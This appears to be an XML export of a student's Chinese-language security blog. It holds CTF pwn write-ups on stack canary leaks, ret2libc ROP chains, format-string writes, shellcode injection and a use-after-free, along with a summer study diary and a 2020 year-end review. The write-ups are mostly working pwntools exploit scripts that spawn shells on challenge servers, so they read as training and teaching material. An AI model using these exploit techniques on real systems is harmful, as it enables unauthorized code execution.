<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./baby_canary&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;sec.arttnba3.cn&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./baby_canary&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pluto/Desktop/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x41</span></span><br><span class="line">p.send(payload1)	<span class="comment">#dont use sendline</span></span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(start) + p32(puts_got)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;flag!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()	</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0xc</span> + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>在覆盖’\x00’得到canary时不能用sendline</p>
<p>这题在本地弄不出来，在远程上就可以。发现是用的libc不一样，本机为libc6-i386_2.21-0ubuntu4_amd64，服务器上是libc6-i386_2.23-0ubuntu11.2_amd64</p>
<h1>ctfwiki</h1>
<h2 id="ROP">ROP</h2>
<h3 id="ret2libc3">ret2libc3</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">stack = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = stack + p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recv1 = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts.got_addr= &quot;</span>,<span class="built_in">hex</span>(recv1))</span><br><span class="line"><span class="comment">#puts.got = cb0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x05fcb0</span></span><br><span class="line">sys_offset = <span class="number">0x03adb0</span></span><br><span class="line">binsh_offset = <span class="number">0x15bb0b</span> </span><br><span class="line"></span><br><span class="line">libc_base = recv1 - puts_offset</span><br><span class="line">sys_addr = libc_base + sys_offset</span><br><span class="line">binsh = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload2 = stack + p32(sys_addr) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>libc 对应的是libc6_2.23-0ubuntu11.2_i386，对此是完全没想到的…</p>
<p>讲的挺好的https://www.jianshu.com/p/83f55c55c173</p>
<h1>XCTF进阶</h1>
<h2 id="实时数据监测">实时数据监测</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">35866</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,<span class="number">0x0804a048</span>,<span class="number">0x02223322</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGF6aHVhbmxhbi5jb20vMjAxOS8xMS8wNy81ZGMzZDY3NjM1ZGZlLw==">https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/<i class="fa fa-external-link-alt"></i></span></p>
<p>用ctfwiki提供的脚本比较快，自己试挺麻烦的…（还是不太熟练</p>
<h2 id="welpwn">welpwn</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./8&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32410</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./8&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">sys_off = <span class="number">0x045390</span></span><br><span class="line">write_off = <span class="number">0x0f72b0</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">pop = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(<span class="number">0x4007CD</span>)</span><br><span class="line"><span class="comment">#0x18+pop(8个字节)用于复制（下一个函数）后填充第二个栈到返回地址，然后将write的got表pop到rdi，用puts输出，返回到main函数的开头，设置环境</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = p.recvuntil(&quot;\\&quot;)</span></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br><span class="line">write_addr = <span class="built_in">int</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> write_addr</span><br><span class="line">base = write_addr - write_off</span><br><span class="line">sys = base + sys_off</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>好像服务器上和本地程序用的libc又不一样…所以连接完远程服务器后再获得一次write的got表，然后找到libc版本</p>
<p>主要学到了这个方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>将接收到的数字左对齐，并用’\00’填充为8位，</p>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tdXppYmluZy5naXRodWIuaW8vMjAyMC8wNi8xMi8yMDIwLjA2LjEyJUVGJUJDJTg4MTI1JUVGJUJDJTg5">https://muzibing.github.io/2020/06/12/2020.06.12（125）<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="monkey">monkey</h2>
<p>考察js shell</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ nc <span class="number">220.249</span><span class="number">.52</span><span class="number">.133</span> <span class="number">56451</span></span><br><span class="line">js&gt; os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">/home/ctf</span><br><span class="line">js&gt; os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">js&gt; os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">cyberpeace&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure>
<h2 id=""></h2>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>大一暑假日常</title>
    <url>/31605.html</url>
    <content><![CDATA[<h2 id="8-8">8-8</h2>
<p>上周在做moectf，被新生赛弄自闭了（</p>
<p>加密与解密</p>
<h2 id="8-1">8-1</h2>
<p>7-31没学所以没写…<br>
写了七题moectf，两题re，三题web，一题pwn，一题经典密码<br>
pwn写的感觉自己很瓜，有个叫backdoor的函数名硬是看了半个小时没看到…</p>
<span id="more"></span>
<h2 id="7-29、7-30">7-29、7-30</h2>
<p>7-29：早上看了点数据结构-树，下午坐动车，在车上看了《程》第六章前三节（然后就睡着了…，晚上啥也没干，日报也没写:)<br>
7-30：写了一题pwn，两题re</p>
<p><a href="/2827.html">材料</a></p>
<h2 id="7-28">7-28</h2>
<p>昨天晚上以为把昨天的上传掉了，结果早上彦林哥问起来的时候发现并没有弄上…下午发现因为昨天那篇用了大括号，hexo g的时候报错了（然后没有注意到就hexo d了）<br>
大括号嵌套使用的时候要加上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% raw %&#125;内容&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
<p>好像其他括号啥的直接嵌套着用也会报错，不过还没有遇到</p>
<ol>
<li>数据结构看了串和树的开头</li>
<li>写了一题pwnable.kr上的题</li>
</ol>
<p>本来想写个攻防世界上的”guess_num“，结果场景加载不出来</p>
<p><a href="/53130.html">材料</a></p>
<h2 id="7-27">7-27</h2>
<p>看了点数据结构，本来想写一题pwn题，结果pwntools突然用不了（可能是之前删了一些文件），安装pwndbg也不知道有没有弄上…就没写了<br>
早上kali网络连不上，虚拟机上弄了半个小时没好，物理机的网络重新连接一下又好了…<br>
打算这几天写掉这两题</p>
<ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1NyZwYWdlPTE=">guess_num<i class="fa fa-external-link-alt"></i></span></li>
<li>passcode:ssh <span class="exturl" data-url="bWFpbHRvOnBhc3Njb2RlQHB3bmFibGUua3I=">passcode@pwnable.kr<i class="fa fa-external-link-alt"></i></span> -p2222 (pw:guest)</li>
</ol>
<p><a href="/52170.html">材料(笔记)</a></p>
<h2 id="7-24">7-24</h2>
<ol>
<li>一题pwn。有思路，但是有个地方不知道怎么实现，看了别人的exp知道怎么写了，不过有些地方还不是很懂</li>
<li>《逆向工程核心原理》第四章</li>
</ol>
<p><a href="/51850.html">材料</a></p>
<h2 id="7-23">7-23</h2>
<ol>
<li>写了一题攻防世界的pwn题:<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1MSZwYWdlPTE=">when_did_you_born<i class="fa fa-external-link-alt"></i></span>，看了一题<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1NyZwYWdlPTE=">guess_num<i class="fa fa-external-link-alt"></i></span>，还没写出来（应该是不会了…）</li>
<li>看了点数据结构的堆栈  部分</li>
</ol>
<p>写题花了比较久，差不多是看了三题发现一题会写，一题思路错了，一题根本没思路…<br>
<a href="/64573.html">材料</a></p>
<h2 id="7-22">7-22</h2>
<p>今天有半天在动车上…</p>
<ol>
<li>攻防世界上写了一题pwn：<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1MyZwYWdlPTE=">level0<i class="fa fa-external-link-alt"></i></span></li>
<li>《程》第四章第一节到第四节</li>
</ol>
<p>打算以后十一点半后不看手机电脑了:(<br>
好像也没啥材料写…</p>
<h2 id="7-21">7-21</h2>
<p>昨天（周一）把《程》第三章看完，感觉没啥好写的（其实是晚上十一点才想起来就懒得写了…）</p>
<ol>
<li>发现上回把pwntools装上了（之前以为没装成），就在pwnable.kr上写了两题，攻防世界写了一题pwn。emmm看的题比写的多一点</li>
<li>看了《逆向工程核心原理》的第二章。分析了“hello world”程序，讲了两种修改输出字符串的方法。没啥想法。</li>
</ol>
<p>感觉最近越来越懒了…一直看电脑导致眼睛也有点不舒服…<br>
不想看PDF，想买书了orz<br>
<a href="/14532.html">今天的材料</a></p>
<h2 id="7-17">7-17</h2>
<ol>
<li>把数据结构数组的部分跳过了，看了一些堆栈的</li>
<li>写了个<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwODEmcGFnZT0x">攻防世界上的re题<i class="fa fa-external-link-alt"></i></span> (以及九道非常入门的web题…)</li>
</ol>
<p><a href="/12344.html">今天的材料</a></p>
<h2 id="7-16">7-16</h2>
<ol>
<li>看了点数组（对称矩阵的压缩存储）。感觉各种存储结构好复杂…明天再查点资料</li>
<li>把昨天那题剩下的部分看完了</li>
</ol>
<p><a href="/13445.html">今天的材料</a></p>
<h2 id="7-15">7-15</h2>
<ol>
<li>《程》第三章第三节</li>
<li>数据结构线性表的两个应用举例。一个是链式存储一元多项式的和，这个之前在mooc上看过，没啥感觉；另一个打印文本文件最后n行，链表的部分懂了，argc、*argv[]和通过命令行输入参数不是很懂…</li>
<li>把彦林学长上回给的一题逆向题再看了一点，就汇编代码对照着伪代码理解了一下</li>
</ol>
<p><a href="/64075.html">这个是有关材料</a></p>
<h2 id="7-14">7-14</h2>
<p>今天跟昨天差不多，早上有点事，下午去驾校，（晚上打lol），学的很少…</p>
<ol>
<li>《程》第三章，（本来以为能把这章看完，但事实上并没有…）就看了前两节。跟《加密与解密》十一章（PE）有点关系，就多了个ELF文件，感觉这个讲的更细一些，也对之前看的加密与解密更理解了（大概吧）</li>
<li>双向循环链表和非循环链表。把指针设为llink和rlink，其它好像不是特别难（…）。这章还剩下应用举例没看，感觉好像有点复杂Orz</li>
</ol>
<h2 id="7-13">7-13</h2>
<p>（今天好像没干啥，早上有点事，下午去驾校挂科二时长的时候才开始看点书）</p>
<ol>
<li>看了点线性链表，感觉基本跟上学期学的没啥差别，就再多了逆转、合并、排序，感觉挺巧妙的但不难</li>
<li>《程序员的自我修养》看完了第二章，上周第一章“回顾大家所了解的”看得瑟瑟发抖。这章了解了一些预处理、编译、汇编和链接的大致过程，还有静态语言、动态语言、静态链接、动态链接的区别。emmm写编译器真是太难了…</li>
</ol>
]]></content>
      <tags>
        <tag>日报</tag>
      </tags>
  </entry>
  <entry>
    <title>2020总结以及2021的flag</title>
    <url>/3919.html</url>
    <content><![CDATA[<p>昨天00：40睡到了11：00…</p>
<span id="more"></span>
<h2 id="学习方面">学习方面</h2>
<p>课内学的好水…无论大一下的网课还是大二上在学校上的，跟考研直接相关的数据结构学的还行，概率论就比较差了。<br>
本来以为以后不会跟电路打交道，于是几节关键的数电网课就没听（后面就听不懂了），前段时间了解iot安全和计组后发现跟电路的关联还是比较大的，特别是iot的硬件方向。也许我某一天也会有点懊恼没认真听大物和离散？终究是路走窄了23333</p>
<p>实验室方向方面，算是看完了《逆向工程核心原理》《加密与解密》《程序员的自我修养》。三本书都还是处于常看常新的状态（尤其是前两本，看的时候一知半解，现在估计也忘了好多…）。<br>
今年学的还是太慢了，特别是上半年。上回在知乎上看到龙佬大二上的某个提问（学了《逆向》《加密》《python》《cppp》《0day2》）麻了。作为还能苟活在实验室而没有被踢掉的菜鸡，诚惶诚恐。<br>
ctf-wiki上学到了heap，配合别人写的guidance看了一点malloc.c源码<br>
感觉现在好像对底层的实现更有兴趣，比如bios、操作系统、编译原理、各种引擎、通信协议、汇编，which 完全不是 child dream 和去年学计算机的原因嘛23333…<br>
搭了个ctf平台用于纳新，算是用过了xshell和docker（再次大言不惭），熟悉了od和ida还有linux、vim的简单用法和命令。<br>
除了专业知识外，感觉对安全的领域和路了解太少了。</p>
<p>课外的话，在Trump和COVID-19的合作摧毁了公知和美分的谎言后，开始以其他角度，（或许更全面的）认识某些事情，有了一点政治、经济的常识（大言不惭），当然依旧羡慕Donald那种能表达为语言和文字的能力和积累。<br>
看了一点《千年金融史》（真·一点）</p>
<h2 id="其他">其他</h2>
<ul>
<li>当了个安全组组长，经历了协会纳新、小组考核、开会等，感觉有空可以开一篇记一下个中感受</li>
<li>（好像…又再次坚定要考研也是在今年哎，冲！）</li>
<li>报了三个ctf比赛（湖湘杯，X-NUCA,校赛），湖湘杯忘了参加，X-NUCA啥都不会，只会校赛。虽然校赛贼水，但也算是参加过了个ctf，算是感受了比赛的过程。</li>
<li>上半年在家的时候，在网上教一个人学c，并浪费了好多时间，后来第一次产生&quot;后悔遇到某人&quot;的愤懑</li>
<li>依然没有对哪个妹子产生过想要追的感觉，有时候觉得现在的日常安排挺充实的，为啥要多一个人出来干扰（…），毕竟连买/白嫖了的游戏都没时间玩（…)</li>
<li>入门了网球</li>
<li>过了科二，快要拿到驾照了（是没啥能写的 所以来凑数了吗）</li>
</ul>
<h2 id="Flag">Flag</h2>
<ul>
<li>看完《经济学原理》（两本）《两次全球大危机的比较研究》，（去年立的“看三本书”的flag果然没有达成，今年就更具体一点好了…）</li>
<li>背完考研单词</li>
<li>复习高数</li>
<li>看x86汇编、从龙佬那嫖来的glibc内存管理、csapp、操作系统、0day2、漏洞战争</li>
<li>打几个ctf</li>
<li>早睡（…)</li>
<li>坚持锻炼，特指开始jogging</li>
<li>去西北或东欧旅游（如果能的话…这是去年的flag了）</li>
<li>继续买基金（12月底因为懒得看，把手上的基本都卖了…</li>
</ul>
<p>over！</p>
]]></content>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
  <entry>
    <title>第六届网络空间安全技术赛pwn</title>
    <url>/54551.html</url>
    <content><![CDATA[<p>比赛没参加，本篇纯属因为无聊才写的(一个多月没做pwn了，顺便复习一下exp咋写…)</p>
<span id="more"></span>
<p><a href="">题目</a></p>
<h1>small</h1>
<p>应该是签到题吧<br>
checksec一看，保护全没开，极有可能<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508154649.png" alt="20210508154649"><br>
向大小为0x10的栈read 0x400个字节，很直接的想法就是输入shellcode然后跳转执行<br>
再一看下方有一个大小为0x50的bss段，exp差不多就能出来了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./small&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x401015</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x402030</span>) + shellcode</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>上学期西电新生赛的栈迁移都比这个灵活</p>
<h1>bank</h1>
<p>checksec:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508195950.png" alt="20210508195950"><br>
拖到ida里：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202927.png" alt="20210508202927"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202941.png" alt="20210508202941"><br>
先判断输入的password，然后printf存在很明显的格式化字符串漏洞，用于打印flag</p>
<p>其中格式化字符串的漏洞只需要能够读栈上的值即可，这题的有意思的点在于爆破绕过strcmp<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212659.png" alt="20210508212659"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212648.png" alt="20210508212648"><br>
注：fgets读取到“\n”时结束</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	i+=<span class="number">1</span></span><br><span class="line">    p=process(<span class="string">&quot;./bank&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your account:\n&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your password:\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">	<span class="comment">#p.sendlineafter(&quot;Do you want to check your account balance?\n&quot;,&quot;yes&quot;)</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input your private code: \n&quot;</span>,<span class="string">&quot;%8$s&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>18年网鼎杯有个跟/dev/urandom有关的题目，<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDY1OTAuaHRtJUVGJUJDJThDJUU4JTlCJUFFJUU2JTlDJTg5JUU2JTg0JThGJUU2JTgwJTlEJUU3JTlBJTg0JUVGJUJDJThDbGludXglRTklQkIlOTglRTglQUUlQTQlRTUlOEQlOTUlRTQlQjglQUElRTglQkYlOUIlRTclQTglOEIlRTYlODklOTMlRTUlQkMlODAlRTclOUElODQlRTYlOUMlODAlRTUlQTQlQTclRTYlOTYlODclRTQlQkIlQjYlRTYlOTUlQjAlRTQlQjglQkExMDI0">https://bbs.pediy.com/thread-246590.htm，蛮有意思的，linux默认单个进程打开的最大文件数为1024<i class="fa fa-external-link-alt"></i></span></p>
<h1>managebook</h1>
<p>常规的uaf，类似经典的hacknote</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size,name,summary_size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name: &quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(summary_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">num,size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span 